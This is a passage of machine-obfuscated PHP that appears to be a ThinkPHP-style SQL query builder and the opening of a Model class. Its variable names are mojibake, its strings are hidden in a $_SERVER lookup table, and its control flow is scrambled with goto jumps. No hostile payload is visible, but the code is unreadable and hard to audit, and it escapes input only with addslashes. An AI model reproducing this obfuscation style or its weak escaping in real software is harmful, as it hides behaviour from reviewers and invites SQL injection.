(strpos($bµ¥÷½ô—ï, $dÌì“’¡Ğ[290])) { $cêÃÒÈí¤ = explode($dÌì“’¡Ğ[290], $bµ¥÷½ô—ï); $CçÒ‚‡Ûƒ = array(); foreach ($cêÃÒÈí¤ as $A©°ÃÆçïá => $F‚³äÍá) { $bÑ÷Å¼‰Ê¾ = $d¸‡ÛŸÅæ ? $F¨ğ–•ôè[$A©°ÃÆçïá] : $F¨ğ–•ôè; $CçÒ‚‡Ûƒ[] = $dÌì“’¡Ğ[267] . $this->parseWhereItem($this->parseKey($F‚³äÍá), $bÑ÷Å¼‰Ê¾) . $dÌì“’¡Ğ[866]; } $F¼§”±«¼Ç .= implode($dÌì“’¡Ğ[967], $CçÒ‚‡Ûƒ); } elseif (strpos($bµ¥÷½ô—ï, $dÌì“’¡Ğ[291])) { $cêÃÒÈí¤ = explode($dÌì“’¡Ğ[291], $bµ¥÷½ô—ï); $CçÒ‚‡Ûƒ = array(); foreach ($cêÃÒÈí¤ as $A©°ÃÆçïá => $F‚³äÍá) { $bÑ÷Å¼‰Ê¾ = $d¸‡ÛŸÅæ ? $F¨ğ–•ôè[$A©°ÃÆçïá] : $F¨ğ–•ôè; $CçÒ‚‡Ûƒ[] = $dÌì“’¡Ğ[267] . $this->parseWhereItem($this->parseKey($F‚³äÍá), $bÑ÷Å¼‰Ê¾) . $dÌì“’¡Ğ[866]; } $F¼§”±«¼Ç .= implode($dÌì“’¡Ğ[962], $CçÒ‚‡Ûƒ); } else { $F¼§”±«¼Ç .= $this->parseWhereItem($this->parseKey($bµ¥÷½ô—ï), $F¨ğ–•ôè); } } $F¼§”±«¼Ç .= $dÌì“’¡Ğ[285] . $eµ×‡‘Èå²; } $F¼§”±«¼Ç = substr($F¼§”±«¼Ç, 0, -strlen($eµ×‡‘Èå²)); } return empty($F¼§”±«¼Ç) ? $dÌì“’¡Ğ[33] : $dÌì“’¡Ğ[968] . $F¼§”±«¼Ç; } protected function parseWhereItem($böøñš¨†“, $b¨¥¥Ã÷×†) { $cŞ™Èƒåš =& $_SERVER[Ü˜]; $B‚ù„ºî¸ = $cŞ™Èƒåš[33]; if (is_array($b¨¥¥Ã÷×†)) { if (is_string($b¨¥¥Ã÷×†[0])) { $Fñƒº¥È¢î = strtolower($b¨¥¥Ã÷×†[0]); if (in_array($b¨¥¥Ã÷×†[0], array($cŞ™Èƒåš[952], $cŞ™Èƒåš[969], $cŞ™Èƒåš[970], $cŞ™Èƒåš[971], $cŞ™Èƒåš[972], $cŞ™Èƒåš[973]))) { $B‚ù„ºî¸ .= $böøñš¨†“ . $cŞ™Èƒåš[50] . $b¨¥¥Ã÷×†[0] . $cŞ™Èƒåš[50] . $this->parseValue($b¨¥¥Ã÷×†[1]); } elseif (preg_match($cŞ™Èƒåš[974], $b¨¥¥Ã÷×†[0])) { $B‚ù„ºî¸ .= $böøñš¨†“ . $cŞ™Èƒåš[50] . $this->exp[$Fñƒº¥È¢î] . $cŞ™Èƒåš[50] . $this->parseValue($b¨¥¥Ã÷×†[1]); } elseif (preg_match($cŞ™Èƒåš[975], $b¨¥¥Ã÷×†[0])) { if (is_array($b¨¥¥Ã÷×†[1])) { $B¾•ÑŞØ×È = isset($b¨¥¥Ã÷×†[2]) ? strtoupper($b¨¥¥Ã÷×†[2]) : $cŞ™Èƒåš[960]; if (in_array($B¾•ÑŞØ×È, array($cŞ™Èƒåš[959], $cŞ™Èƒåš[960], $cŞ™Èƒåš[961]))) { $Cˆ¢­‡ËÎ‚ = array(); foreach ($b¨¥¥Ã÷×†[1] as $CŠ—¢„æÅ) { $Cˆ¢­‡ËÎ‚[] = $böøñš¨†“ . $cŞ™Èƒåš[50] . $this->exp[$Fñƒº¥È¢î] . $cŞ™Èƒåš[50] . $this->parseValue($CŠ—¢„æÅ); } $B‚ù„ºî¸ .= $cŞ™Èƒåš[267] . implode($cŞ™Èƒåš[50] . $B¾•ÑŞØ×È . $cŞ™Èƒåš[50], $Cˆ¢­‡ËÎ‚) . $cŞ™Èƒåš[866]; } } else { $B‚ù„ºî¸ .= $böøñš¨†“ . $cŞ™Èƒåš[50] . $this->exp[$Fñƒº¥È¢î] . $cŞ™Èƒåš[50] . $this->parseValue($b¨¥¥Ã÷×†[1]); } } elseif ($cŞ™Èƒåš[304] == $Fñƒº¥È¢î) { $B‚ù„ºî¸ .= $cŞ™Èƒåš[864] . $böøñš¨†“ . $cŞ™Èƒåš[50] . $b¨¥¥Ã÷×†[1] . $cŞ™Èƒåš[976]; } elseif (preg_match($cŞ™Èƒåš[977], $b¨¥¥Ã÷×†[0])) { $B‚ù„ºî¸ .= $b¨¥¥Ã÷×†[0]; } elseif (preg_match($cŞ™Èƒåš[978], $b¨¥¥Ã÷×†[0])) { if (isset($b¨¥¥Ã÷×†[2]) && $cŞ™Èƒåš[304] == $b¨¥¥Ã÷×†[2]) { $B‚ù„ºî¸ .= $böøñš¨†“ . $cŞ™Èƒåš[50] . $this->exp[$Fñƒº¥È¢î] . $cŞ™Èƒåš[50] . $b¨¥¥Ã÷×†[1]; } else { if (is_string($b¨¥¥Ã÷×†[1])) { $b¨¥¥Ã÷×†[1] = explode($cŞ™Èƒåš[47], $b¨¥¥Ã÷×†[1]); } $C“ÕÑ»‘È¼ = implode($cŞ™Èƒåš[47], $this->parseValue($b¨¥¥Ã÷×†[1])); $B‚ù„ºî¸ .= $böøñš¨†“ . $cŞ™Èƒåš[50] . $this->exp[$Fñƒº¥È¢î] . $cŞ™Èƒåš[864] . $C“ÕÑ»‘È¼ . $cŞ™Èƒåš[866]; } } elseif (preg_match($cŞ™Èƒåš[979], $b¨¥¥Ã÷×†[0])) { $CÉËˆÆ®âÃ = is_string($b¨¥¥Ã÷×†[1]) ? explode($cŞ™Èƒåš[47], $b¨¥¥Ã÷×†[1]) : $b¨¥¥Ã÷×†[1]; $B‚ù„ºî¸ .= $cŞ™Èƒåš[864] . $böøñš¨†“ . $cŞ™Èƒåš[50] . $this->exp[$Fñƒº¥È¢î] . $cŞ™Èƒåš[50] . $this->parseValue($CÉËˆÆ®âÃ[0]) . $cŞ™Èƒåš[962] . $this->parseValue($CÉËˆÆ®âÃ[1]) . $cŞ™Èƒåš[285]; } else { think_exception(think_lang($cŞ™Èƒåš[965]) . $cŞ™Èƒåš[4] . $b¨¥¥Ã÷×†[0]); } } else { $dô„£¡º = count($b¨¥¥Ã÷×†); $F×ï¬¥Ğî· = $cŞ™Èƒåš[33]; if (is_string($b¨¥¥Ã÷×†[$dô„£¡º - 1])) { $F×ï¬¥Ğî· = isset($b¨¥¥Ã÷×†[$dô„£¡º - 1]) ? strtoupper($b¨¥¥Ã÷×†[$dô„£¡º - 1]) : $cŞ™Èƒåš[33]; if (in_array($F×ï¬¥Ğî·, array($cŞ™Èƒåš[959], $cŞ™Èƒåš[960], $cŞ™Èƒåš[961]))) { $dô„£¡º = $dô„£¡º - 1; } } else { $F×ï¬¥Ğî· = $cŞ™Èƒåš[959]; } for ($E±å¬‡¡Ï = 0; $E±å¬‡¡Ï < $dô„£¡º; $E±å¬‡¡Ï++) { $CÉËˆÆ®âÃ = is_array($b¨¥¥Ã÷×†[$E±å¬‡¡Ï]) ? $b¨¥¥Ã÷×†[$E±å¬‡¡Ï][1] : $b¨¥¥Ã÷×†[$E±å¬‡¡Ï]; if ($cŞ™Èƒåš[304] == strtolower($b¨¥¥Ã÷×†[$E±å¬‡¡Ï][0])) { $B‚ù„ºî¸ .= $cŞ™Èƒåš[267] . $böøñš¨†“ . $cŞ™Èƒåš[50] . $CÉËˆÆ®âÃ . $cŞ™Èƒåš[976] . $F×ï¬¥Ğî· . $cŞ™Èƒåš[50]; } else { $c®ŞŠÏ¬‘é = is_array($b¨¥¥Ã÷×†[$E±å¬‡¡Ï]) ? $this->exp[strtolower($b¨¥¥Ã÷×†[$E±å¬‡¡Ï][0])] : $cŞ™Èƒåš[952]; if (!$c®ŞŠÏ¬‘é && is_array($b¨¥¥Ã÷×†[$E±å¬‡¡Ï]) && in_array($b¨¥¥Ã÷×†[$E±å¬‡¡Ï][0], array($cŞ™Èƒåš[952], $cŞ™Èƒåš[969], $cŞ™Èƒåš[970], $cŞ™Èƒåš[971], $cŞ™Èƒåš[972], $cŞ™Èƒåš[973]))) { $c®ŞŠÏ¬‘é = $b¨¥¥Ã÷×†[$E±å¬‡¡Ï][0]; } $B‚ù„ºî¸ .= $cŞ™Èƒåš[267] . $böøñš¨†“ . $cŞ™Èƒåš[50] . $c®ŞŠÏ¬‘é . $cŞ™Èƒåš[50] . $this->parseValue($CÉËˆÆ®âÃ) . $cŞ™Èƒåš[976] . $F×ï¬¥Ğî· . $cŞ™Èƒåš[50]; } } $B‚ù„ºî¸ = substr($B‚ù„ºî¸, 0, -4); } } else { $B‚ù„ºî¸ .= $böøñš¨†“ . $cŞ™Èƒåš[980] . $this->parseValue($b¨¥¥Ã÷×†); } return $B‚ù„ºî¸; } protected function parseThinkWhere($F‹Ò“ø’åË, $c¢Ñ÷³È¯ğ) { $d¾åŠ—› =& $_SERVER[Ü˜]; $E‘›ÙÒÖÒ = $d¾åŠ—›[33]; switch ($F‹Ò“ø’åË) { case $d¾åŠ—›[359]: $E‘›ÙÒÖÒ = $c¢Ñ÷³È¯ğ; break; case $d¾åŠ—›[963]: $E‘›ÙÒÖÒ = is_string($c¢Ñ÷³È¯ğ) ? $c¢Ñ÷³È¯ğ : substr($this->parseWhere($c¢Ñ÷³È¯ğ), 6); break; case $d¾åŠ—›[981]: parse_str($c¢Ñ÷³È¯ğ, $dó¤Æø³Û˜); if (isset($dó¤Æø³Û˜[$d¾åŠ—›[958]])) { $CÒ’”„Ó—® = $d¾åŠ—›[50] . strtoupper($dó¤Æø³Û˜[$d¾åŠ—›[958]]) . $d¾åŠ—›[50]; unset($dó¤Æø³Û˜[$d¾åŠ—›[958]]); } else { $CÒ’”„Ó—® = $d¾åŠ—›[962]; } $E‰öÊŞÁø = array(); foreach ($dó¤Æø³Û˜ as $aÁ»·‡÷®è => $cèÃÖø·ïª) { $E‰öÊŞÁø[] = $this->parseKey($aÁ»·‡÷®è) . $d¾åŠ—›[980] . $this->parseValue($cèÃÖø·ïª); } $E‘›ÙÒÖÒ = implode($CÒ’”„Ó—®, $E‰öÊŞÁø); break; } return $E‘›ÙÒÖÒ; } protected function parseLimit($E³ŠéÌ†‡‚) { $E˜ìç¸ÕÙ =& $_SERVER[Ü˜]; return !empty($E³ŠéÌ†‡‚) ? $E˜ìç¸ÕÙ[48] . $E³ŠéÌ†‡‚ . $E˜ìç¸ÕÙ[50] : $E˜ìç¸ÕÙ[33]; } protected function parseJoin($b©Ğ—˜‰¬®) { $A‘à¨¦Šª¡ =& $_SERVER[Ü˜]; $d…©ŞÄËÚ… = $A‘à¨¦Šª¡[33]; if (!empty($b©Ğ—˜‰¬®)) { if (is_array($b©Ğ—˜‰¬®)) { foreach ($b©Ğ—˜‰¬® as $Dóµ°ÁÕÁà => $fùŠë¢…¯) { if (!1 !== stripos($fùŠë¢…¯, $A‘à¨¦Šª¡[982])) { $d…©ŞÄËÚ… .= $A‘à¨¦Šª¡[50] . $fùŠë¢…¯; } else { $d…©ŞÄËÚ… .= $A‘à¨¦Šª¡[983] . $fùŠë¢…¯; } } } else { $d…©ŞÄËÚ… .= $A‘à¨¦Šª¡[983] . $b©Ğ—˜‰¬®; } } $d…©ŞÄËÚ… = preg_replace($A‘à¨¦Šª¡[984], think_config($A‘à¨¦Šª¡[890]) . $A‘à¨¦Šª¡[985], $d…©ŞÄËÚ…); return $d…©ŞÄËÚ…; } protected function parseOrder($d¾œ»¨ğ±í) { $fº†¿…£‚ñ =& $_SERVER[Ü˜]; if (is_array($d¾œ»¨ğ±í)) { $A¦çÒæÅ¢õ = array(); foreach ($d¾œ»¨ğ±í as $a²ÉÄ‚×ø„ => $d¤âÊ½ÑÁ‡) { if (is_numeric($a²ÉÄ‚×ø„)) { $A¦çÒæÅ¢õ[] = $this->parseKey($d¤âÊ½ÑÁ‡); } else { $d¤âÊ½ÑÁ‡ = in_array(strtoupper(trim($d¤âÊ½ÑÁ‡)), array($fº†¿…£‚ñ[986], $fº†¿…£‚ñ[987])) ? $fº†¿…£‚ñ[50] . $d¤âÊ½ÑÁ‡ : $fº†¿…£‚ñ[33]; if (preg_match($fº†¿…£‚ñ[988], $a²ÉÄ‚×ø„)) { $A¦çÒæÅ¢õ[] = $this->parseKey($a²ÉÄ‚×ø„) . $d¤âÊ½ÑÁ‡; } else { think_exception($fº†¿…£‚ñ[989] . $a²ÉÄ‚×ø„); } } } $d¾œ»¨ğ±í = implode($fº†¿…£‚ñ[47], $A¦çÒæÅ¢õ); } return !empty($d¾œ»¨ğ±í) ? $fº†¿…£‚ñ[990] . $d¾œ»¨ğ±í : $fº†¿…£‚ñ[33]; } protected function parseGroup($CÅÈåò›§) { $a¶«â¡«í‡ =& $_SERVER[Ü˜]; return !empty($CÅÈåò›§) ? $a¶«â¡«í‡[991] . $CÅÈåò›§ : $a¶«â¡«í‡[33]; } protected function parseHaving($f–Ó„Ò§¹­) { $Fñêí”¼Šì =& $_SERVER[Ü˜]; return !empty($f–Ó„Ò§¹­) ? $Fñêí”¼Šì[992] . $f–Ó„Ò§¹­ : $Fñêí”¼Šì[33]; } protected function parseComment($fÕâ®ã‹î) { $C¤²†‰‘‹‹ =& $_SERVER[Ü˜]; return !empty($fÕâ®ã‹î) ? $C¤²†‰‘‹‹[993] . $fÕâ®ã‹î . $C¤²†‰‘‹‹[994] : $C¤²†‰‘‹‹[33]; } protected function parseDistinct($DË²ô¶ïª) { $aõÏÚ ¹À =& $_SERVER[Ü˜]; return !empty($DË²ô¶ïª) ? $aõÏÚ ¹À[995] : $aõÏÚ ¹À[33]; } protected function parseUnion($dÂ›»éÏË) { $BĞÛ¨Ö« =& $_SERVER[Ü˜]; if (empty($dÂ›»éÏË)) { return $BĞÛ¨Ö«[33]; } if (isset($dÂ›»éÏË[$BĞÛ¨Ö«[355]])) { $báğ„Ç¿ÔÏ = $BĞÛ¨Ö«[996]; unset($dÂ›»éÏË[$BĞÛ¨Ö«[355]]); } else { $báğ„Ç¿ÔÏ = $BĞÛ¨Ö«[997]; } foreach ($dÂ›»éÏË as $fïí¦¨ÎãÁ) { $b¯Œ¤ÜˆÖ«[] = $báğ„Ç¿ÔÏ . (is_array($fïí¦¨ÎãÁ) ? $this->buildSelectSql($fïí¦¨ÎãÁ) : $fïí¦¨ÎãÁ); } return implode($BĞÛ¨Ö«[50], $b¯Œ¤ÜˆÖ«); } public function insert($A‡ğ®®Ì£, $A¥ÒšÅ—ëÀ = array(), $Dæ¿ò½Ì­… = false) { goto cæ“¸¬ÇŞ; cæ“¸¬ÇŞ: $eÕÙõ„¸æ‡ =& $_SERVER[Ü˜]; $E‚Õ”àÊ» = $d®Îã¼œ‘ = array(); $this->model = $A¥ÒšÅ—ëÀ[$eÕÙõ„¸æ‡[288]]; goto Cİ×ò¼“™¯; FÁ¼æ½é¶: $AÂÍŠÊÇîİ .= $this->parseComment(!empty($A¥ÒšÅ—ëÀ[$eÕÙõ„¸æ‡[361]]) ? $A¥ÒšÅ—ëÀ[$eÕÙõ„¸æ‡[361]] : $eÕÙõ„¸æ‡[33]); return $this->execute($AÂÍŠÊÇîİ, $this->parseBind(!empty($A¥ÒšÅ—ëÀ[$eÕÙõ„¸æ‡[292]]) ? $A¥ÒšÅ—ëÀ[$eÕÙõ„¸æ‡[292]] : array())); goto D‡ƒ—÷·Òƒ; Cİ×ò¼“™¯: foreach ($A‡ğ®®Ì£ as $b†ù¢ ¼²– => $D»ùï¬É»Ç) { if (is_array($D»ùï¬É»Ç) && $eÕÙõ„¸æ‡[304] == $D»ùï¬É»Ç[0]) { $d®Îã¼œ‘[] = $this->parseKey($b†ù¢ ¼²–); $E‚Õ”àÊ»[] = $D»ùï¬É»Ç[1]; } elseif (is_scalar($D»ùï¬É»Ç) || is_null($D»ùï¬É»Ç)) { $d®Îã¼œ‘[] = $this->parseKey($b†ù¢ ¼²–); $E‚Õ”àÊ»[] = $this->parseValue($D»ùï¬É»Ç); } } $AÂÍŠÊÇîİ = ($Dæ¿ò½Ì­… ? $eÕÙõ„¸æ‡[868] : $eÕÙõ„¸æ‡[869]) . $eÕÙõ„¸æ‡[870] . $this->parseTable($A¥ÒšÅ—ëÀ[$eÕÙõ„¸æ‡[286]]) . $eÕÙõ„¸æ‡[864] . implode($eÕÙõ„¸æ‡[47], $d®Îã¼œ‘) . $eÕÙõ„¸æ‡[865] . implode($eÕÙõ„¸æ‡[47], $E‚Õ”àÊ») . $eÕÙõ„¸æ‡[866]; $AÂÍŠÊÇîİ .= $this->parseLock(isset($A¥ÒšÅ—ëÀ[$eÕÙõ„¸æ‡[821]]) ? $A¥ÒšÅ—ëÀ[$eÕÙõ„¸æ‡[821]] : !1); goto FÁ¼æ½é¶; D‡ƒ—÷·Òƒ: } public function selectInsert($E¨ÂåƒÌ‚‰, $DËÒßö ·Â, $bæä·ÚìÓå = array()) { goto CË·‰™ó±ä; a·Ø…éå‘‚: array_walk($E¨ÂåƒÌ‚‰, array($this, $bä¼·š©…Ü[867])); $D†É¢–é‰ = $bä¼·š©…Ü[998] . $this->parseTable($DËÒßö ·Â) . $bä¼·š©…Ü[864] . implode($bä¼·š©…Ü[47], $E¨ÂåƒÌ‚‰) . $bä¼·š©…Ü[976]; $D†É¢–é‰ .= $this->buildSelectSql($bæä·ÚìÓå); goto cêªÓğùß³; cêªÓğùß³: return $this->execute($D†É¢–é‰, $this->parseBind(!empty($bæä·ÚìÓå[$bä¼·š©…Ü[292]]) ? $bæä·ÚìÓå[$bä¼·š©…Ü[292]] : array())); goto BŒê¹”¯éë; CË·‰™ó±ä: $bä¼·š©…Ü =& $_SERVER[Ü˜]; $this->model = $bæä·ÚìÓå[$bä¼·š©…Ü[288]]; if (is_string($E¨ÂåƒÌ‚‰)) { $E¨ÂåƒÌ‚‰ = explode($bä¼·š©…Ü[47], $E¨ÂåƒÌ‚‰); } goto a·Ø…éå‘‚; BŒê¹”¯éë: } public function update($F¾Ö½­ìá, $DâÌ‰¢—¶Û) { $Fİ´¨ÆÕ™À =& $_SERVER[Ü˜]; $this->model = $DâÌ‰¢—¶Û[$Fİ´¨ÆÕ™À[288]]; $d¼İ¿Úó÷ç = $Fİ´¨ÆÕ™À[999] . $this->parseTable($DâÌ‰¢—¶Û[$Fİ´¨ÆÕ™À[286]]) . $this->parseSet($F¾Ö½­ìá) . $this->parseWhere(!empty($DâÌ‰¢—¶Û[$Fİ´¨ÆÕ™À[282]]) ? $DâÌ‰¢—¶Û[$Fİ´¨ÆÕ™À[282]] : $Fİ´¨ÆÕ™À[33]) . $this->parseOrder(!empty($DâÌ‰¢—¶Û[$Fİ´¨ÆÕ™À[372]]) ? $DâÌ‰¢—¶Û[$Fİ´¨ÆÕ™À[372]] : $Fİ´¨ÆÕ™À[33]) . $this->parseLimit(!empty($DâÌ‰¢—¶Û[$Fİ´¨ÆÕ™À[299]]) ? $DâÌ‰¢—¶Û[$Fİ´¨ÆÕ™À[299]] : $Fİ´¨ÆÕ™À[33]) . $this->parseLock(isset($DâÌ‰¢—¶Û[$Fİ´¨ÆÕ™À[821]]) ? $DâÌ‰¢—¶Û[$Fİ´¨ÆÕ™À[821]] : !1) . $this->parseComment(!empty($DâÌ‰¢—¶Û[$Fİ´¨ÆÕ™À[361]]) ? $DâÌ‰¢—¶Û[$Fİ´¨ÆÕ™À[361]] : $Fİ´¨ÆÕ™À[33]); return $this->execute($d¼İ¿Úó÷ç, $this->parseBind(!empty($DâÌ‰¢—¶Û[$Fİ´¨ÆÕ™À[292]]) ? $DâÌ‰¢—¶Û[$Fİ´¨ÆÕ™À[292]] : array())); } public function delete($eÄ³‹Ú¢¯ = array()) { $c„Şó„·Âˆ =& $_SERVER[Ü˜]; $this->model = $eÄ³‹Ú¢¯[$c„Şó„·Âˆ[288]]; $dî°ˆç¬‚ = $c„Şó„·Âˆ[1000] . $this->parseTable($eÄ³‹Ú¢¯[$c„Şó„·Âˆ[286]]) . $this->parseWhere(!empty($eÄ³‹Ú¢¯[$c„Şó„·Âˆ[282]]) ? $eÄ³‹Ú¢¯[$c„Şó„·Âˆ[282]] : $c„Şó„·Âˆ[33]) . $this->parseOrder(!empty($eÄ³‹Ú¢¯[$c„Şó„·Âˆ[372]]) ? $eÄ³‹Ú¢¯[$c„Şó„·Âˆ[372]] : $c„Şó„·Âˆ[33]) . $this->parseLimit(!empty($eÄ³‹Ú¢¯[$c„Şó„·Âˆ[299]]) ? $eÄ³‹Ú¢¯[$c„Şó„·Âˆ[299]] : $c„Şó„·Âˆ[33]) . $this->parseLock(isset($eÄ³‹Ú¢¯[$c„Şó„·Âˆ[821]]) ? $eÄ³‹Ú¢¯[$c„Şó„·Âˆ[821]] : !1) . $this->parseComment(!empty($eÄ³‹Ú¢¯[$c„Şó„·Âˆ[361]]) ? $eÄ³‹Ú¢¯[$c„Şó„·Âˆ[361]] : $c„Şó„·Âˆ[33]); return $this->execute($dî°ˆç¬‚, $this->parseBind(!empty($eÄ³‹Ú¢¯[$c„Şó„·Âˆ[292]]) ? $eÄ³‹Ú¢¯[$c„Şó„·Âˆ[292]] : array())); } public function select($EöÃ¢”©ˆ = array()) { goto eŠ…¾ğ÷Ş¥; bÚ®‘ÄçÀ: $d”˜¤ëõË = isset($EöÃ¢”©ˆ[$EôŒí’Ç‘[356]]) ? $EöÃ¢”©ˆ[$EôŒí’Ç‘[356]] : !1; if ($d”˜¤ëõË) { $eØ…ùÛ… „ = is_string($d”˜¤ëõË[$EôŒí’Ç‘[103]]) ? $d”˜¤ëõË[$EôŒí’Ç‘[103]] : $EôŒí’Ç‘[1001] . md5($A•Ñ’ÖòÊ); $cÁ—¢ÀŠ¤‹ = think_cache($eØ…ùÛ… „, $EôŒí’Ç‘[33], $d”˜¤ëõË); if (!1 !== $cÁ—¢ÀŠ¤‹) { return $cÁ—¢ÀŠ¤‹; } } $F“¦ñ•¬²† = $this->query($A•Ñ’ÖòÊ, $this->parseBind(!empty($EöÃ¢”©ˆ[$EôŒí’Ç‘[292]]) ? $EöÃ¢”©ˆ[$EôŒí’Ç‘[292]] : array())); goto E“ÆÃÀ»©Ñ; E“ÆÃÀ»©Ñ: if ($d”˜¤ëõË && !1 !== $F“¦ñ•¬²†) { think_cache($eØ…ùÛ… „, $F“¦ñ•¬²†, $d”˜¤ëõË); } return $F“¦ñ•¬²†; goto dĞ¸ç¯—ƒá; eŠ…¾ğ÷Ş¥: $EôŒí’Ç‘ =& $_SERVER[Ü˜]; $this->model = $EöÃ¢”©ˆ[$EôŒí’Ç‘[288]]; $A•Ñ’ÖòÊ = $this->buildSelectSql($EöÃ¢”©ˆ); goto bÚ®‘ÄçÀ; dĞ¸ç¯—ƒá: } public function buildSelectSql($AàƒÌÈø‡ = array()) { goto cƒø›ñ®Ò»; cƒø›ñ®Ò»: $fÃ—Âë‰Ü• =& $_SERVER[Ü˜]; if (isset($AàƒÌÈø‡[$fÃ—Âë‰Ü•[360]])) { if (strpos($AàƒÌÈø‡[$fÃ—Âë‰Ü•[360]], $fÃ—Âë‰Ü•[47])) { list($F¹¼”‡»ßñ, $bì¹¶ÌÑœØ) = explode($fÃ—Âë‰Ü•[47], $AàƒÌÈø‡[$fÃ—Âë‰Ü•[360]]); } else { $F¹¼”‡»ßñ = $AàƒÌÈø‡[$fÃ—Âë‰Ü•[360]]; } $F¹¼”‡»ßñ = $F¹¼”‡»ßñ ? $F¹¼”‡»ßñ : 1; $bì¹¶ÌÑœØ = isset($bì¹¶ÌÑœØ) ? $bì¹¶ÌÑœØ : (is_numeric($AàƒÌÈø‡[$fÃ—Âë‰Ü•[299]]) ? $AàƒÌÈø‡[$fÃ—Âë‰Ü•[299]] : 20); $C¼ß‘êŒƒ¸ = $bì¹¶ÌÑœØ * ((int) $F¹¼”‡»ßñ - 1); $AàƒÌÈø‡[$fÃ—Âë‰Ü•[299]] = $C¼ß‘êŒƒ¸ . $fÃ—Âë‰Ü•[47] . $bì¹¶ÌÑœØ; } if (think_config($fÃ—Âë‰Ü•[1002])) { $c„ãÎ’‘Î = $fÃ—Âë‰Ü•[1003] . md5(serialize($AàƒÌÈø‡)); $cõÈ«Å½‰ = think_cache($c„ãÎ’‘Î); if ($cõÈ«Å½‰) { return $cõÈ«Å½‰; } } goto cî°ÎÑ‘„±; cî°ÎÑ‘„±: $c¸¯ĞéÊå‰ = $this->parseSql($this->selectSql, $AàƒÌÈø‡); $c¸¯ĞéÊå‰ .= $this->parseLock(isset($AàƒÌÈø‡[$fÃ—Âë‰Ü•[821]]) ? $AàƒÌÈø‡[$fÃ—Âë‰Ü•[821]] : !1); if (isset($c„ãÎ’‘Î)) { think_cache($c„ãÎ’‘Î, $c¸¯ĞéÊå‰); } goto a¼„â…¹äÌ; a¼„â…¹äÌ: return $c¸¯ĞéÊå‰; goto D‚“œìĞ®¼; D‚“œìĞ®¼: } public function parseSql($eŒ¦µã”İë, $dí›Úø½©´ = array()) { $d¹ˆØÌËªŞ =& $_SERVER[Ü˜]; $eŒ¦µã”İë = str_replace(array($d¹ˆØÌËªŞ[1004], $d¹ˆØÌËªŞ[1005], $d¹ˆØÌËªŞ[1006], $d¹ˆØÌËªŞ[1007], $d¹ˆØÌËªŞ[1008], $d¹ˆØÌËªŞ[1009], $d¹ˆØÌËªŞ[1010], $d¹ˆØÌËªŞ[1011], $d¹ˆØÌËªŞ[1012], $d¹ˆØÌËªŞ[1013], $d¹ˆØÌËªŞ[1014]), array($this->parseTable("{$dí›Úø½©´[$d¹ˆØÌËªŞ[286]]}"), $this->parseDistinct(isset($dí›Úø½©´[$d¹ˆØÌËªŞ[1015]]) ? $dí›Úø½©´[$d¹ˆØÌËªŞ[1015]] : !1), $this->parseField(!empty($dí›Úø½©´[$d¹ˆØÌËªŞ[280]]) ? $dí›Úø½©´[$d¹ˆØÌËªŞ[280]] : $d¹ˆØÌËªŞ[192]), $this->parseJoin(!empty($dí›Úø½©´[$d¹ˆØÌËªŞ[289]]) ? $dí›Úø½©´[$d¹ˆØÌËªŞ[289]] : $d¹ˆØÌËªŞ[33]), $this->parseWhere(!empty($dí›Úø½©´[$d¹ˆØÌËªŞ[282]]) ? $dí›Úø½©´[$d¹ˆØÌËªŞ[282]] : $d¹ˆØÌËªŞ[33]), $this->parseGroup(!empty($dí›Úø½©´[$d¹ˆØÌËªŞ[1016]]) ? $dí›Úø½©´[$d¹ˆØÌËªŞ[1016]] : $d¹ˆØÌËªŞ[33]), $this->parseHaving(!empty($dí›Úø½©´[$d¹ˆØÌËªŞ[1017]]) ? $dí›Úø½©´[$d¹ˆØÌËªŞ[1017]] : $d¹ˆØÌËªŞ[33]), $this->parseOrder(!empty($dí›Úø½©´[$d¹ˆØÌËªŞ[372]]) ? $dí›Úø½©´[$d¹ˆØÌËªŞ[372]] : $d¹ˆØÌËªŞ[33]), $this->parseLimit(!empty($dí›Úø½©´[$d¹ˆØÌËªŞ[299]]) ? $dí›Úø½©´[$d¹ˆØÌËªŞ[299]] : $d¹ˆØÌËªŞ[33]), $this->parseUnion(!empty($dí›Úø½©´[$d¹ˆØÌËªŞ[354]]) ? $dí›Úø½©´[$d¹ˆØÌËªŞ[354]] : $d¹ˆØÌËªŞ[33]), $this->parseComment(!empty($dí›Úø½©´[$d¹ˆØÌËªŞ[361]]) ? $dí›Úø½©´[$d¹ˆØÌËªŞ[361]] : $d¹ˆØÌËªŞ[33])), $eŒ¦µã”İë); return $eŒ¦µã”İë; } public function getLastSql($a‘Õ°¬°Ï = '') { return $a‘Õ°¬°Ï ? $this->modelSql[$a‘Õ°¬°Ï] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($B×Œèš²¤…) { return addslashes($B×Œèš²¤…); } public function setModel($CœÜÊŸŒë) { $this->model = $CœÜÊŸŒë; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } $AÃ­ÒÃ‰Ÿ = $_SERVER[$_SERVER[Ü˜][57]]; $FíÊÑ³‡¢¬ = $_SERVER[Ü˜][58]; goto D²å®ÍùŸ; c‚ÆãŠ°: define($_SERVER[Ü˜][249], 0); define($_SERVER[Ü˜][250], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\154\x65", "\x6f\162\x64\x65\162", "\141\x6c\151\x61\x73", "\x68\141\x76\151\x6e\147", "\147\x72\157\165\160", "\154\157\143\x6b", "\144\151\x73\164\151\x6e\x63\x74", "\x61\165\x74\x6f", "\146\x69\154\164\145\162", "\166\141\x6c\151\144\x61\x74\x65", "\x72\x65\x73\165\x6c\x74", "\142\151\x6e\144", "\164\157\153\145\156"); public function __construct($c›ñ¤Ä°—š = '', $bî§ïœ³çŸ = '', $Fğº²¿ç‘» = '') { $B÷·ôÕ¢«ß =& $_SERVER[Ü˜]; $this->_initialize(); if (!empty($c›ñ¤Ä°—š)) { if (strpos($c›ñ¤Ä°—š, $B÷·ôÕ¢«ß[105])) { list($this->dbName, $this->name) = explode($B÷·ôÕ¢«ß[105], $c›ñ¤Ä°—š); } else { $this->name = $c›ñ¤Ä°—š; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($bî§ïœ³çŸ)) { $this->tablePrefix = 